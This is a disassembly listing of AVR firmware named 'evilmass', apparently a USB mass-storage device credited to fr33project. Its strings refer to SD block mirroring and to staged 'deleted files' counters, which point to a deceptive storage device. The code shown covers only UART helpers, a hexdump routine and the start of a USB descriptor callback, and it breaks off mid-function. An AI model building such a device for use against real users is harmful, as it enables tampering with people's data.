
evilmass.elf:     file format elf32-avr

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .data         0000080c  00800100  00007986  00007a1a  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  1 .text         00007986  00000000  00000000  00000094  2**1
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .bss          000004f6  0080090c  0080090c  00008226  2**0
                  ALLOC
  3 .noinit       00000004  00800e02  00800e02  00008226  2**0
                  ALLOC
  4 .comment      0000005c  00000000  00000000  00008226  2**0
                  CONTENTS, READONLY
  5 .note.gnu.avr.deviceinfo 00000040  00000000  00000000  00008284  2**2
                  CONTENTS, READONLY
  6 .debug_aranges 00000a00  00000000  00000000  000082c8  2**3
                  CONTENTS, READONLY, DEBUGGING
  7 .debug_info   00012687  00000000  00000000  00008cc8  2**0
                  CONTENTS, READONLY, DEBUGGING
  8 .debug_abbrev 00003a36  00000000  00000000  0001b34f  2**0
                  CONTENTS, READONLY, DEBUGGING
  9 .debug_line   000139d2  00000000  00000000  0001ed85  2**0
                  CONTENTS, READONLY, DEBUGGING
 10 .debug_frame  000028d8  00000000  00000000  00032758  2**2
                  CONTENTS, READONLY, DEBUGGING
 11 .debug_str    0001e5d2  00000000  00000000  00035030  2**0
                  CONTENTS, READONLY, DEBUGGING
 12 .debug_loc    000102c7  00000000  00000000  00053602  2**0
                  CONTENTS, READONLY, DEBUGGING
 13 .debug_ranges 00000be8  00000000  00000000  000638c9  2**0
                  CONTENTS, READONLY, DEBUGGING
 14 .debug_macro  0000a2c5  00000000  00000000  000644b1  2**0
                  CONTENTS, READONLY, DEBUGGING

Disassembly of section .text:

00000000 <__vectors>:
       0:	9c c1       	rjmp	.+824    	; 0x33a <__ctors_end>
       2:	00 00       	nop
       4:	b9 c1       	rjmp	.+882    	; 0x378 <__bad_interrupt>
       6:	00 00       	nop
       8:	b7 c1       	rjmp	.+878    	; 0x378 <__bad_interrupt>
       a:	00 00       	nop
       c:	b5 c1       	rjmp	.+874    	; 0x378 <__bad_interrupt>
       e:	00 00       	nop
      10:	b3 c1       	rjmp	.+870    	; 0x378 <__bad_interrupt>
      12:	00 00       	nop
      14:	b1 c1       	rjmp	.+866    	; 0x378 <__bad_interrupt>
      16:	00 00       	nop
      18:	af c1       	rjmp	.+862    	; 0x378 <__bad_interrupt>
      1a:	00 00       	nop
      1c:	ad c1       	rjmp	.+858    	; 0x378 <__bad_interrupt>
      1e:	00 00       	nop
      20:	ab c1       	rjmp	.+854    	; 0x378 <__bad_interrupt>
      22:	00 00       	nop
      24:	a9 c1       	rjmp	.+850    	; 0x378 <__bad_interrupt>
      26:	00 00       	nop
      28:	0c 94 cb 35 	jmp	0x6b96	; 0x6b96 <__vector_10>
      2c:	0c 94 97 36 	jmp	0x6d2e	; 0x6d2e <__vector_11>
      30:	a3 c1       	rjmp	.+838    	; 0x378 <__bad_interrupt>
      32:	00 00       	nop
      34:	a1 c1       	rjmp	.+834    	; 0x378 <__bad_interrupt>
      36:	00 00       	nop
      38:	9f c1       	rjmp	.+830    	; 0x378 <__bad_interrupt>
      3a:	00 00       	nop
      3c:	9d c1       	rjmp	.+826    	; 0x378 <__bad_interrupt>
      3e:	00 00       	nop
      40:	9b c1       	rjmp	.+822    	; 0x378 <__bad_interrupt>
      42:	00 00       	nop
      44:	99 c1       	rjmp	.+818    	; 0x378 <__bad_interrupt>
      46:	00 00       	nop
      48:	97 c1       	rjmp	.+814    	; 0x378 <__bad_interrupt>
      4a:	00 00       	nop
      4c:	95 c1       	rjmp	.+810    	; 0x378 <__bad_interrupt>
      4e:	00 00       	nop
      50:	93 c1       	rjmp	.+806    	; 0x378 <__bad_interrupt>
      52:	00 00       	nop
      54:	91 c1       	rjmp	.+802    	; 0x378 <__bad_interrupt>
      56:	00 00       	nop
      58:	8f c1       	rjmp	.+798    	; 0x378 <__bad_interrupt>
      5a:	00 00       	nop
      5c:	8d c1       	rjmp	.+794    	; 0x378 <__bad_interrupt>
      5e:	00 00       	nop
      60:	8b c1       	rjmp	.+790    	; 0x378 <__bad_interrupt>
      62:	00 00       	nop
      64:	89 c1       	rjmp	.+786    	; 0x378 <__bad_interrupt>
      66:	00 00       	nop
      68:	87 c1       	rjmp	.+782    	; 0x378 <__bad_interrupt>
      6a:	00 00       	nop
      6c:	85 c1       	rjmp	.+778    	; 0x378 <__bad_interrupt>
      6e:	00 00       	nop
      70:	83 c1       	rjmp	.+774    	; 0x378 <__bad_interrupt>
      72:	00 00       	nop
      74:	81 c1       	rjmp	.+770    	; 0x378 <__bad_interrupt>
      76:	00 00       	nop
      78:	7f c1       	rjmp	.+766    	; 0x378 <__bad_interrupt>
      7a:	00 00       	nop
      7c:	7d c1       	rjmp	.+762    	; 0x378 <__bad_interrupt>
      7e:	00 00       	nop
      80:	0c 94 dd 1b 	jmp	0x37ba	; 0x37ba <__vector_32>
      84:	79 c1       	rjmp	.+754    	; 0x378 <__bad_interrupt>
      86:	00 00       	nop
      88:	77 c1       	rjmp	.+750    	; 0x378 <__bad_interrupt>
      8a:	00 00       	nop
      8c:	75 c1       	rjmp	.+746    	; 0x378 <__bad_interrupt>
      8e:	00 00       	nop
      90:	73 c1       	rjmp	.+742    	; 0x378 <__bad_interrupt>
      92:	00 00       	nop
      94:	71 c1       	rjmp	.+738    	; 0x378 <__bad_interrupt>
	...

00000098 <__trampolines_end>:
      98:	65 70       	andi	r22, 0x05	; 5
      9a:	70 72       	andi	r23, 0x20	; 32
      9c:	5f 76       	andi	r21, 0x6F	; 111
      9e:	61 72       	andi	r22, 0x21	; 33
      a0:	73 20       	and	r7, r3
      a2:	61 64       	ori	r22, 0x41	; 65
      a4:	64 72       	andi	r22, 0x24	; 36
      a6:	3a 20       	and	r3, r10
      a8:	30 78       	andi	r19, 0x80	; 128
      aa:	25 30       	cpi	r18, 0x05	; 5
      ac:	38 58       	subi	r19, 0x88	; 136
      ae:	0d 0a       	sbc	r0, r29
      b0:	65 70       	andi	r22, 0x05	; 5
      b2:	70 72       	andi	r23, 0x20	; 32
      b4:	5f 76       	andi	r21, 0x6F	; 111
      b6:	61 72       	andi	r22, 0x21	; 33
      b8:	73 20       	and	r7, r3
      ba:	73 69       	ori	r23, 0x93	; 147
      bc:	7a 65       	ori	r23, 0x5A	; 90
      be:	3a 20       	and	r3, r10
      c0:	25 64       	ori	r18, 0x45	; 69
      c2:	0d 0a       	sbc	r0, r29
      c4:	65 70       	andi	r22, 0x05	; 5
      c6:	70 72       	andi	r23, 0x20	; 32
      c8:	5f 76       	andi	r21, 0x6F	; 111
      ca:	61 72       	andi	r22, 0x21	; 33
      cc:	73 2e       	mov	r7, r19
      ce:	72 65       	ori	r23, 0x52	; 82
      d0:	73 74       	andi	r23, 0x43	; 67
      d2:	6f 72       	andi	r22, 0x2F	; 47
      d4:	65 5f       	subi	r22, 0xF5	; 245
      d6:	64 65       	ori	r22, 0x54	; 84
      d8:	66 61       	ori	r22, 0x16	; 22
      da:	75 6c       	ori	r23, 0xC5	; 197
      dc:	74 73       	andi	r23, 0x34	; 52
      de:	5f 6f       	ori	r21, 0xFF	; 255
      e0:	6e 5f       	subi	r22, 0xFE	; 254
      e2:	62 6f       	ori	r22, 0xF2	; 242
      e4:	6f 74       	andi	r22, 0x4F	; 79
      e6:	20 3d       	cpi	r18, 0xD0	; 208
      e8:	20 25       	eor	r18, r0
      ea:	64 0d       	add	r22, r4
      ec:	0a 65       	ori	r16, 0x5A	; 90
      ee:	70 70       	andi	r23, 0x00	; 0
      f0:	72 5f       	subi	r23, 0xF2	; 242
      f2:	76 61       	ori	r23, 0x16	; 22
      f4:	72 73       	andi	r23, 0x32	; 50
      f6:	2e 63       	ori	r18, 0x3E	; 62
      f8:	75 72       	andi	r23, 0x25	; 37
      fa:	72 5f       	subi	r23, 0xF2	; 242
      fc:	73 74       	andi	r23, 0x43	; 67
      fe:	61 67       	ori	r22, 0x71	; 113
     100:	65 20       	and	r6, r5
     102:	3d 20       	and	r3, r13
     104:	25 64       	ori	r18, 0x45	; 69
     106:	0d 0a       	sbc	r0, r29
     108:	65 70       	andi	r22, 0x05	; 5
     10a:	70 72       	andi	r23, 0x20	; 32
     10c:	5f 76       	andi	r21, 0x6F	; 111
     10e:	61 72       	andi	r22, 0x21	; 33
     110:	73 2e       	mov	r7, r19
     112:	64 65       	ori	r22, 0x54	; 84
     114:	6c 65       	ori	r22, 0x5C	; 92
     116:	74 65       	ori	r23, 0x54	; 84
     118:	64 5f       	subi	r22, 0xF4	; 244
     11a:	66 69       	ori	r22, 0x96	; 150
     11c:	6c 65       	ori	r22, 0x5C	; 92
     11e:	73 20       	and	r7, r3
     120:	3d 20       	and	r3, r13
     122:	25 64       	ori	r18, 0x45	; 69
     124:	0d 0a       	sbc	r0, r29
     126:	65 70       	andi	r22, 0x05	; 5
     128:	70 72       	andi	r23, 0x20	; 32
     12a:	5f 76       	andi	r21, 0x6F	; 111
     12c:	61 72       	andi	r22, 0x21	; 33
     12e:	73 2e       	mov	r7, r19
     130:	63 75       	andi	r22, 0x53	; 83
     132:	72 72       	andi	r23, 0x22	; 34
     134:	5f 73       	andi	r21, 0x3F	; 63
     136:	65 63       	ori	r22, 0x35	; 53
     138:	74 6f       	ori	r23, 0xF4	; 244
     13a:	72 5f       	subi	r23, 0xF2	; 242
     13c:	73 74       	andi	r23, 0x43	; 67
     13e:	61 67       	ori	r22, 0x71	; 113
     140:	65 31       	cpi	r22, 0x15	; 21
     142:	5f 64       	ori	r21, 0x4F	; 79
     144:	65 6c       	ori	r22, 0xC5	; 197
     146:	65 74       	andi	r22, 0x45	; 69
     148:	65 64       	ori	r22, 0x45	; 69
     14a:	20 3d       	cpi	r18, 0xD0	; 208
     14c:	20 25       	eor	r18, r0
     14e:	75 0d       	add	r23, r5
     150:	0a 65       	ori	r16, 0x5A	; 90
     152:	70 70       	andi	r23, 0x00	; 0
     154:	72 5f       	subi	r23, 0xF2	; 242
     156:	76 61       	ori	r23, 0x16	; 22
     158:	72 73       	andi	r23, 0x32	; 50
     15a:	2e 63       	ori	r18, 0x3E	; 62
     15c:	75 72       	andi	r23, 0x25	; 37
     15e:	72 5f       	subi	r23, 0xF2	; 242
     160:	73 65       	ori	r23, 0x53	; 83
     162:	63 74       	andi	r22, 0x43	; 67
     164:	6f 72       	andi	r22, 0x2F	; 47
     166:	5f 73       	andi	r21, 0x3F	; 63
     168:	74 61       	ori	r23, 0x14	; 20
     16a:	67 65       	ori	r22, 0x57	; 87
     16c:	32 5f       	subi	r19, 0xF2	; 242
     16e:	64 65       	ori	r22, 0x54	; 84
     170:	6c 65       	ori	r22, 0x5C	; 92
     172:	74 65       	ori	r23, 0x54	; 84
     174:	64 20       	and	r6, r4
     176:	3d 20       	and	r3, r13
     178:	25 75       	andi	r18, 0x55	; 85
     17a:	0d 0a       	sbc	r0, r29
	...

0000017d <__c.5111>:
     17d:	0d 0a 72 65 73 65 74 74 69 6e 67 20 65 70 70 72     ..resetting eppr
     18d:	6f 6d 20 76 61 6c 75 65 73 20 69 6e 20 74 68 65     om values in the
     19d:	20 6e 65 78 74 20 72 65 62 6f 6f 74 0d 0a 00         next reboot...

000001ac <__c.5084>:
     1ac:	52 65 61 64 79 0d 0a 00                             Ready...

000001b4 <__c.5078>:
     1b4:	44 69 73 63 6f 6e 6e 65 63 74 0d 0a 00              Disconnect...

000001c1 <__c.5073>:
     1c1:	43 6f 6e 6e 65 63 74 0d 0a 00                       Connect...

000001cb <__c.5063>:
     1cb:	68 74 74 70 73 3a 2f 2f 77 77 77 2e 66 72 33 33     https://www.fr33
     1db:	70 72 6f 6a 65 63 74 2e 6f 72 67 0d 0a 70 6f 77     project.org..pow
     1eb:	65 72 65 64 20 62 79 20 4c 55 46 41 20 68 74 74     ered by LUFA htt
     1fb:	70 3a 2f 2f 65 6c 6d 2d 63 68 61 6e 2e 6f 72 67     p://elm-chan.org
     20b:	2f 66 73 77 2f 66 66 2f 30 30 69 6e 64 65 78 5f     /fsw/ff/00index_
     21b:	65 2e 68 74 6d 6c 20 61 6e 64 20 46 61 74 46 73     e.html and FatFs
     22b:	20 68 74 74 70 3a 2f 2f 65 6c 6d 2d 63 68 61 6e      http://elm-chan
     23b:	2e 6f 72 67 2f 66 73 77 2f 66 66 2f 30 30 69 6e     .org/fsw/ff/00in
     24b:	64 65 78 5f 65 2e 68 74 6d 6c 0d 0a 0d 0a 00        dex_e.html.....

0000025a <__c.5192>:
     25a:	0d 0a 0d 1b 52 52 4f 52 21 21 21 20 42 6c 6f 63     ....RROR!!! Bloc
     26a:	6b 41 64 64 72 65 73 73 20 69 6d 70 6f 73 73 69     kAddress impossi
     27a:	62 6c 65 20 74 6f 20 6d 69 72 72 6f 72 0d 0a 0d     ble to mirror...
     28a:	0a 00                                               ..

0000028c <__c.5184>:
     28c:	52 20 25 6c 69 20 25 69 0d 0a 00                    R %li %i...

00000297 <__c.5135>:
     297:	0d 0a 0d 0a 45 52 52 4f 52 21 21 21 20 42 6c 6f     ....ERROR!!! Blo
     2a7:	63 6b 41 64 64 72 65 73 73 20 69 6d 70 6f 73 73     ckAddress imposs
     2b7:	69 62 6c 65 20 74 6f 20 6d 69 72 72 6f 72 0d 0a     ible to mirror..
     2c7:	0d 0a 00                                            ...

000002ca <__c.5129>:
     2ca:	57 20 25 6c 69 20 25 69 0d 0a 00                    W %li %i...

000002d5 <__c.5115>:
     2d5:	53 44 20 62 6c 6f 63 6b 73 3a 20 25 6c 69 0d 0a     SD blocks: %li..
	...

000002e6 <__c.5108>:
     2e6:	0d 0a 0d 0a 00                                      .....

000002eb <__c.5106>:
     2eb:	66 69 72 73 74 20 53 44 20 73 65 63 74 6f 72 3a     first SD sector:
     2fb:	0d 0a 00                                            ...

000002fe <__c.5104>:
     2fe:	64 69 73 6b 5f 69 6e 69 74 69 61 6c 69 7a 65 20     disk_initialize 
     30e:	73 75 63 63 65 73 73 0d 0a 00                       success...

00000318 <__c.5100>:
     318:	74 72 79 69 6e 67 20 2e 2e 2e 20 64 69 73 6b 5f     trying ... disk_
     328:	69 6e 69 74 69 61 6c 69 7a 65 0d 0a 00              initialize...

00000335 <__c.5098>:
     335:	0d 0a 0d 0a 00                                      .....

0000033a <__ctors_end>:
     33a:	11 24       	eor	r1, r1
     33c:	1f be       	out	0x3f, r1	; 63
     33e:	cf ef       	ldi	r28, 0xFF	; 255
     340:	d0 e2       	ldi	r29, 0x20	; 32
     342:	de bf       	out	0x3e, r29	; 62
     344:	cd bf       	out	0x3d, r28	; 61

00000346 <__do_copy_data>:
     346:	19 e0       	ldi	r17, 0x09	; 9
     348:	a0 e0       	ldi	r26, 0x00	; 0
     34a:	b1 e0       	ldi	r27, 0x01	; 1
     34c:	e6 e8       	ldi	r30, 0x86	; 134
     34e:	f9 e7       	ldi	r31, 0x79	; 121
     350:	00 e0       	ldi	r16, 0x00	; 0
     352:	0b bf       	out	0x3b, r16	; 59
     354:	02 c0       	rjmp	.+4      	; 0x35a <__do_copy_data+0x14>
     356:	07 90       	elpm	r0, Z+
     358:	0d 92       	st	X+, r0
     35a:	ac 30       	cpi	r26, 0x0C	; 12
     35c:	b1 07       	cpc	r27, r17
     35e:	d9 f7       	brne	.-10     	; 0x356 <__do_copy_data+0x10>

00000360 <__do_clear_bss>:
     360:	2e e0       	ldi	r18, 0x0E	; 14
     362:	ac e0       	ldi	r26, 0x0C	; 12
     364:	b9 e0       	ldi	r27, 0x09	; 9
     366:	01 c0       	rjmp	.+2      	; 0x36a <.do_clear_bss_start>

00000368 <.do_clear_bss_loop>:
     368:	1d 92       	st	X+, r1

0000036a <.do_clear_bss_start>:
     36a:	a2 30       	cpi	r26, 0x02	; 2
     36c:	b2 07       	cpc	r27, r18
     36e:	e1 f7       	brne	.-8      	; 0x368 <.do_clear_bss_loop>
     370:	0e 94 d1 1c 	call	0x39a2	; 0x39a2 <main>
     374:	0c 94 c1 3c 	jmp	0x7982	; 0x7982 <_exit>

00000378 <__bad_interrupt>:
     378:	43 ce       	rjmp	.-890    	; 0x0 <__vectors>

0000037a <on_sd>:
}

void uart_putsnl(char* s)
{
    uart_puts(s);
    uart_puts("\r\n");
     37a:	84 b1       	in	r24, 0x04	; 4
     37c:	80 64       	ori	r24, 0x40	; 64
     37e:	84 b9       	out	0x04, r24	; 4
     380:	85 b1       	in	r24, 0x05	; 5
     382:	8f 7b       	andi	r24, 0xBF	; 191
     384:	85 b9       	out	0x05, r24	; 5
     386:	08 95       	ret

00000388 <set_bank>:
     388:	91 b3       	in	r25, 0x11	; 17
     38a:	98 7f       	andi	r25, 0xF8	; 248
     38c:	87 70       	andi	r24, 0x07	; 7
     38e:	89 2b       	or	r24, r25
     390:	81 bb       	out	0x11, r24	; 17
     392:	08 95       	ret

00000394 <init_xmem>:
     394:	80 b3       	in	r24, 0x10	; 16
     396:	81 60       	ori	r24, 0x01	; 1
     398:	80 bb       	out	0x10, r24	; 16
     39a:	80 b3       	in	r24, 0x10	; 16
     39c:	82 60       	ori	r24, 0x02	; 2
     39e:	80 bb       	out	0x10, r24	; 16
     3a0:	80 b3       	in	r24, 0x10	; 16
     3a2:	84 60       	ori	r24, 0x04	; 4
     3a4:	80 bb       	out	0x10, r24	; 16
     3a6:	80 b3       	in	r24, 0x10	; 16
     3a8:	88 60       	ori	r24, 0x08	; 8
     3aa:	80 bb       	out	0x10, r24	; 16
     3ac:	81 b3       	in	r24, 0x11	; 17
     3ae:	81 60       	ori	r24, 0x01	; 1
     3b0:	81 bb       	out	0x11, r24	; 17
     3b2:	81 b3       	in	r24, 0x11	; 17
     3b4:	82 60       	ori	r24, 0x02	; 2
     3b6:	81 bb       	out	0x11, r24	; 17
     3b8:	81 b3       	in	r24, 0x11	; 17
     3ba:	84 60       	ori	r24, 0x04	; 4
     3bc:	81 bb       	out	0x11, r24	; 17
     3be:	81 b3       	in	r24, 0x11	; 17
     3c0:	87 7f       	andi	r24, 0xF7	; 247
     3c2:	81 bb       	out	0x11, r24	; 17
     3c4:	10 92 75 00 	sts	0x0075, r1	; 0x800075 <__TEXT_REGION_LENGTH__+0x7e0075>
     3c8:	80 e8       	ldi	r24, 0x80	; 128
     3ca:	80 93 74 00 	sts	0x0074, r24	; 0x800074 <__TEXT_REGION_LENGTH__+0x7e0074>
     3ce:	08 95       	ret

000003d0 <uart_putc>:
     3d0:	90 91 c8 00 	lds	r25, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
     3d4:	95 ff       	sbrs	r25, 5
     3d6:	fc cf       	rjmp	.-8      	; 0x3d0 <uart_putc>
     3d8:	80 93 ce 00 	sts	0x00CE, r24	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
     3dc:	08 95       	ret

000003de <uart_puts>:
     3de:	cf 93       	push	r28
     3e0:	df 93       	push	r29
     3e2:	ec 01       	movw	r28, r24
     3e4:	0f c0       	rjmp	.+30     	; 0x404 <__LOCK_REGION_LENGTH__+0x4>
     3e6:	8a 30       	cpi	r24, 0x0A	; 10
     3e8:	49 f4       	brne	.+18     	; 0x3fc <uart_puts+0x1e>
     3ea:	90 91 0c 09 	lds	r25, 0x090C	; 0x80090c <__data_end>
     3ee:	9d 30       	cpi	r25, 0x0D	; 13
     3f0:	29 f0       	breq	.+10     	; 0x3fc <uart_puts+0x1e>
     3f2:	8d e0       	ldi	r24, 0x0D	; 13
     3f4:	ed df       	rcall	.-38     	; 0x3d0 <uart_putc>
     3f6:	8a e0       	ldi	r24, 0x0A	; 10
     3f8:	eb df       	rcall	.-42     	; 0x3d0 <uart_putc>
     3fa:	01 c0       	rjmp	.+2      	; 0x3fe <uart_puts+0x20>
     3fc:	e9 df       	rcall	.-46     	; 0x3d0 <uart_putc>
     3fe:	89 91       	ld	r24, Y+
     400:	80 93 0c 09 	sts	0x090C, r24	; 0x80090c <__data_end>
     404:	88 81       	ld	r24, Y
     406:	81 11       	cpse	r24, r1
     408:	ee cf       	rjmp	.-36     	; 0x3e6 <uart_puts+0x8>
     40a:	df 91       	pop	r29
     40c:	cf 91       	pop	r28
     40e:	08 95       	ret

00000410 <uart_printhexchar>:
}

void uart_printhexchar(uint8_t charprint)
{
     410:	1f 93       	push	r17
     412:	cf 93       	push	r28
     414:	df 93       	push	r29
     416:	cd b7       	in	r28, 0x3d	; 61
     418:	de b7       	in	r29, 0x3e	; 62
     41a:	61 97       	sbiw	r28, 0x11	; 17
     41c:	0f b6       	in	r0, 0x3f	; 63
     41e:	f8 94       	cli
     420:	de bf       	out	0x3e, r29	; 62
     422:	0f be       	out	0x3f, r0	; 63
     424:	cd bf       	out	0x3d, r28	; 61
     426:	18 2f       	mov	r17, r24
    const char hex[] = "0123456789ABCDEF";
     428:	81 e1       	ldi	r24, 0x11	; 17
     42a:	ec e7       	ldi	r30, 0x7C	; 124
     42c:	f1 e0       	ldi	r31, 0x01	; 1
     42e:	de 01       	movw	r26, r28
     430:	11 96       	adiw	r26, 0x01	; 1
     432:	01 90       	ld	r0, Z+
     434:	0d 92       	st	X+, r0
     436:	8a 95       	dec	r24
     438:	e1 f7       	brne	.-8      	; 0x432 <uart_printhexchar+0x22>

    uart_putc(hex[(charprint >> 4) & 0xF]);
     43a:	81 2f       	mov	r24, r17
     43c:	82 95       	swap	r24
     43e:	8f 70       	andi	r24, 0x0F	; 15
     440:	e1 e0       	ldi	r30, 0x01	; 1
     442:	f0 e0       	ldi	r31, 0x00	; 0
     444:	ec 0f       	add	r30, r28
     446:	fd 1f       	adc	r31, r29
     448:	e8 0f       	add	r30, r24
     44a:	f1 1d       	adc	r31, r1
     44c:	80 81       	ld	r24, Z
     44e:	c0 df       	rcall	.-128    	; 0x3d0 <uart_putc>
    uart_putc(hex[(charprint) & 0xF]);
     450:	1f 70       	andi	r17, 0x0F	; 15
     452:	e1 e0       	ldi	r30, 0x01	; 1
     454:	f0 e0       	ldi	r31, 0x00	; 0
     456:	ec 0f       	add	r30, r28
     458:	fd 1f       	adc	r31, r29
     45a:	e1 0f       	add	r30, r17
     45c:	f1 1d       	adc	r31, r1
     45e:	80 81       	ld	r24, Z
     460:	b7 df       	rcall	.-146    	; 0x3d0 <uart_putc>
}
     462:	61 96       	adiw	r28, 0x11	; 17
     464:	0f b6       	in	r0, 0x3f	; 63
     466:	f8 94       	cli
     468:	de bf       	out	0x3e, r29	; 62
     46a:	0f be       	out	0x3f, r0	; 63
     46c:	cd bf       	out	0x3d, r28	; 61
     46e:	df 91       	pop	r29
     470:	cf 91       	pop	r28
     472:	1f 91       	pop	r17
     474:	08 95       	ret

00000476 <uart_printhexdump>:

void uart_printhexdump(uint8_t* buff, size_t size)
{
     476:	9f 92       	push	r9
     478:	af 92       	push	r10
     47a:	bf 92       	push	r11
     47c:	cf 92       	push	r12
     47e:	df 92       	push	r13
     480:	ef 92       	push	r14
     482:	ff 92       	push	r15
     484:	0f 93       	push	r16
     486:	1f 93       	push	r17
     488:	cf 93       	push	r28
     48a:	df 93       	push	r29
     48c:	ec 01       	movw	r28, r24
     48e:	5b 01       	movw	r10, r22
    uint8_t* aux_buff;

    if (size == 0)
     490:	67 2b       	or	r22, r23
     492:	09 f4       	brne	.+2      	; 0x496 <uart_printhexdump+0x20>
     494:	3c c0       	rjmp	.+120    	; 0x50e <uart_printhexdump+0x98>
     496:	e1 2c       	mov	r14, r1
     498:	f1 2c       	mov	r15, r1
     49a:	32 c0       	rjmp	.+100    	; 0x500 <uart_printhexdump+0x8a>
        return;
    }

    for (int i = 0; i < size; i++)
    {
        uart_printhexchar(*buff++);
     49c:	6e 01       	movw	r12, r28
     49e:	8f ef       	ldi	r24, 0xFF	; 255
     4a0:	c8 1a       	sub	r12, r24
     4a2:	d8 0a       	sbc	r13, r24
     4a4:	88 81       	ld	r24, Y
     4a6:	b4 df       	rcall	.-152    	; 0x410 <uart_printhexchar>
        uart_putc(' ');
     4a8:	80 e2       	ldi	r24, 0x20	; 32
     4aa:	92 df       	rcall	.-220    	; 0x3d0 <uart_putc>
        if ((i + 1) % 16 == 0 || i == size - 1)
     4ac:	ef ef       	ldi	r30, 0xFF	; 255
     4ae:	ee 1a       	sub	r14, r30
     4b0:	fe 0a       	sbc	r15, r30
     4b2:	c7 01       	movw	r24, r14
     4b4:	8f 70       	andi	r24, 0x0F	; 15
     4b6:	99 27       	eor	r25, r25
     4b8:	89 2b       	or	r24, r25
     4ba:	29 f0       	breq	.+10     	; 0x4c6 <uart_printhexdump+0x50>
     4bc:	c5 01       	movw	r24, r10
     4be:	01 97       	sbiw	r24, 0x01	; 1
     4c0:	08 17       	cp	r16, r24
     4c2:	19 07       	cpc	r17, r25
     4c4:	e1 f4       	brne	.+56     	; 0x4fe <uart_printhexdump+0x88>
        {
            aux_buff = buff - 16;
     4c6:	8e 01       	movw	r16, r28
     4c8:	0f 50       	subi	r16, 0x0F	; 15
     4ca:	11 09       	sbc	r17, r1
            for (int j = 0; j < 16; j++)
     4cc:	c0 e0       	ldi	r28, 0x00	; 0
     4ce:	d0 e0       	ldi	r29, 0x00	; 0
     4d0:	10 c0       	rjmp	.+32     	; 0x4f2 <uart_printhexdump+0x7c>
            {
                if (isprint(*aux_buff))
     4d2:	f8 01       	movw	r30, r16
     4d4:	90 80       	ld	r9, Z
     4d6:	89 2d       	mov	r24, r9
     4d8:	90 e0       	ldi	r25, 0x00	; 0
     4da:	0e 94 f1 38 	call	0x71e2	; 0x71e2 <isprint>
     4de:	89 2b       	or	r24, r25
                {
                    uart_putc(*aux_buff);
     4e0:	19 f0       	breq	.+6      	; 0x4e8 <uart_printhexdump+0x72>
     4e2:	89 2d       	mov	r24, r9
     4e4:	75 df       	rcall	.-278    	; 0x3d0 <uart_putc>
                }
                else
                {
                    uart_putc('.');
     4e6:	02 c0       	rjmp	.+4      	; 0x4ec <uart_printhexdump+0x76>
     4e8:	8e e2       	ldi	r24, 0x2E	; 46
     4ea:	72 df       	rcall	.-284    	; 0x3d0 <uart_putc>
                }
                aux_buff++;
     4ec:	0f 5f       	subi	r16, 0xFF	; 255
     4ee:	1f 4f       	sbci	r17, 0xFF	; 255
        uart_printhexchar(*buff++);
        uart_putc(' ');
        if ((i + 1) % 16 == 0 || i == size - 1)
        {
            aux_buff = buff - 16;
            for (int j = 0; j < 16; j++)
     4f0:	21 96       	adiw	r28, 0x01	; 1
     4f2:	c0 31       	cpi	r28, 0x10	; 16
     4f4:	d1 05       	cpc	r29, r1
                {
                    uart_putc('.');
                }
                aux_buff++;
            }
            uart_puts("\r\n");
     4f6:	6c f3       	brlt	.-38     	; 0x4d2 <uart_printhexdump+0x5c>
     4f8:	8c e0       	ldi	r24, 0x0C	; 12
     4fa:	98 e0       	ldi	r25, 0x08	; 8
     4fc:	70 df       	rcall	.-288    	; 0x3de <uart_puts>
     4fe:	e6 01       	movw	r28, r12
    if (size == 0)
    {
        return;
    }

    for (int i = 0; i < size; i++)
     500:	87 01       	movw	r16, r14
     502:	ea 14       	cp	r14, r10
     504:	fb 04       	cpc	r15, r11
                aux_buff++;
            }
            uart_puts("\r\n");
        }
    }
    uart_puts("\r\n");
     506:	50 f2       	brcs	.-108    	; 0x49c <uart_printhexdump+0x26>
     508:	8c e0       	ldi	r24, 0x0C	; 12
     50a:	98 e0       	ldi	r25, 0x08	; 8
     50c:	68 df       	rcall	.-304    	; 0x3de <uart_puts>
}
     50e:	df 91       	pop	r29
     510:	cf 91       	pop	r28
     512:	1f 91       	pop	r17
     514:	0f 91       	pop	r16
     516:	ff 90       	pop	r15
     518:	ef 90       	pop	r14
     51a:	df 90       	pop	r13
     51c:	cf 90       	pop	r12
     51e:	bf 90       	pop	r11
     520:	af 90       	pop	r10
     522:	9f 90       	pop	r9
     524:	08 95       	ret

00000526 <CALLBACK_USB_GetDescriptor>:
 *  USB host.
 */
uint16_t CALLBACK_USB_GetDescriptor(const uint16_t wValue,
                                    const uint16_t wIndex,
                                    const void** const DescriptorAddress)
{
     526:	cf 93       	push	r28
     528:	df 93       	push	r29
     52a:	ea 01       	movw	r28, r20
    const uint8_t  DescriptorType   = (wValue >> 8);
     52c:	29 2f       	mov	r18, r25
     52e:	33 27       	eor	r19, r19
    const uint8_t  DescriptorNumber = (wValue & 0xFF);

    const void* Address = NULL;
    uint16_t    Size    = NO_DESCRIPTOR;

    switch (DescriptorType)
     530:	23 30       	cpi	r18, 0x03	; 3
     532:	31 05       	cpc	r19, r1
     534:	39 f1       	breq	.+78     	; 0x584 <CALLBACK_USB_GetDescriptor+0x5e>
     536:	40 f4       	brcc	.+16     	; 0x548 <CALLBACK_USB_GetDescriptor+0x22>
     538:	21 30       	cpi	r18, 0x01	; 1
     53a:	31 05       	cpc	r19, r1
     53c:	91 f0       	breq	.+36     	; 0x562 <CALLBACK_USB_GetDescriptor+0x3c>
     53e:	22 30       	cpi	r18, 0x02	; 2
     540:	31 05       	cpc	r19, r1
     542:	09 f4       	brne	.+2      	; 0x546 <CALLBACK_USB_GetDescriptor+0x20>
     544:	64 c0       	rjmp	.+200    	; 0x60e <CALLBACK_USB_GetDescriptor+0xe8>
     546:	08 c0       	rjmp	.+16     	; 0x558 <CALLBACK_USB_GetDescriptor+0x32>
     548:	21 32       	cpi	r18, 0x21	; 33
     54a:	31 05       	cpc	r19, r1
     54c:	09 f4       	brne	.+2      	; 0x550 <CALLBACK_USB_GetDescriptor+0x2a>
     54e:	55 c0       	rjmp	.+170    	; 0x5fa <CALLBACK_USB_GetDescriptor+0xd4>
     550:	22 32       	cpi	r18, 0x22	; 34
     552:	31 05       	cpc	r19, r1
     554:	09 f4       	brne	.+2      	; 0x558 <CALLBACK_USB_GetDescriptor+0x32>
     556:	56 c0       	rjmp	.+172    	; 0x604 <CALLBACK_USB_GetDescriptor+0xde>
{
